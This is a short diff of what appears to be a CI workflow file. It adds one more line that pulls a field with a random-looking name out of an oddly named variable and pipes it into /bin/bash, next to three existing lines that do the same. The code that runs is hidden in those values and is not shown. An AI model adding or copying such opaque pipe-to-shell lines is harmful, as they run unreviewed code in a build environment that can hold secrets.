@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$isdmg76" | jq -r .jpg8269 | /bin/bash
           printf '%s' "$kp066" | jq -r .s03 | /bin/bash
           echo $ciw49 | jq -r .xmuvq9 | /bin/bash
+          echo $smgo45995 | jq -r .eqma32 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
